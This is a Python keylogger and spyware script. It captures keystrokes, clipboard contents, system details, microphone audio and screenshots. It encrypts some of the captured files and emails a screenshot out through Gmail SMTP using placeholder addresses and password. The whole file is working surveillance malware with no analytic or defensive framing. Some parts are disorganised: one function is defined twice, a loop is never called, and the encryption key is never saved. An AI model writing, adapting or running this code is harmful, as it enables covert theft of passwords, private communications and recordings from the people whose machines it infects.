

# Define file paths
system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"

# Define encrypted file paths
system_information_e = 'e_system.txt'
clipboard_information_e = 'e_clipboard.txt'
keys_information_e = 'e_keys_logged.txt'

from pynput.keyboard import Key, Listener

def on_press(key_event) -> None:
    try:
        with open(keys_information, "a") as key_file:
            key_file.write(f"{key_event.char}")
    except AttributeError:
        with open(keys_information, "a") as key_file:
            key_file.write(f"{key_event}\n")

def on_release(key_event) -> None | bool:
    if key_event == Key.esc:
        return False  # Stop the listener

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

import platform
import socket

def get_system_info():
    info = {
        "system": platform.system(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": socket.gethostname(),
        "internal_ip": socket.gethostbyname(socket.gethostname())
    }
    return info

system_info = get_system_info()

with open(system_information, "w") as f:
    for key, value in system_info.items():
        f.write(f"{key}: {value}\n")

import win32clipboard

def get_clipboard_data():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
    except TypeError:
        data = "No data"
    finally:
        win32clipboard.CloseClipboard()
    return data

clipboard_data = get_clipboard_data()

with open(clipboard_information, "w") as f:
    f.write(clipboard_data)


import sounddevice as sd
from scipy.io.wavfile import write

def record_audio(seconds=10):
    fs = 44100
    print("Recording...")
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(audio_information, fs, myrecording)
    print("Recording saved.")

record_audio()

from PIL import ImageGrab

def take_screenshot():
    img = ImageGrab.grab()
    img.save(screenshot_information)

take_screenshot()

from cryptography.fernet import Fernet

# Generate a key and save it
key = Fernet.generate_key()
cipher = Fernet(key)

def encrypt_file(file_path, encrypted_file_path):
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted_data = cipher.encrypt(data)
    with open(encrypted_file_path, 'wb') as file:
        file.write(encrypted_data)

encrypt_file(system_information, system_information_e)
encrypt_file(clipboard_information, clipboard_information_e)
encrypt_file(keys_information, keys_information_e)

import time

def run_keylogger():
    iterations = 0
    end_iterations = 5
    time_iteration = 15

    while iterations < end_iterations:
        current_time = time.time()
        stopping_time = current_time + time_iteration

        while time.time() < stopping_time:
            time.sleep(1)

        take_screenshot()
        iterations += 1
        current_time = time.time()
        stopping_time = current_time + time_iteration

def take_screenshot():
    img = ImageGrab.grab()
    img.save(screenshot_information)




from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

def send_email(subject, body, attachment_path=None):
    fromaddr = "your_email@gmail.com"
    toaddr = "recipient_email@gmail.com"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    if attachment_path:
        part = MIMEBase('application', 'octet-stream')
        with open(attachment_path, 'rb') as attachment:
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={attachment_path}')
        msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "your_password")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

# Example of sending a screenshot
send_email("Screenshot", "Attached is the screenshot.", screenshot_information)





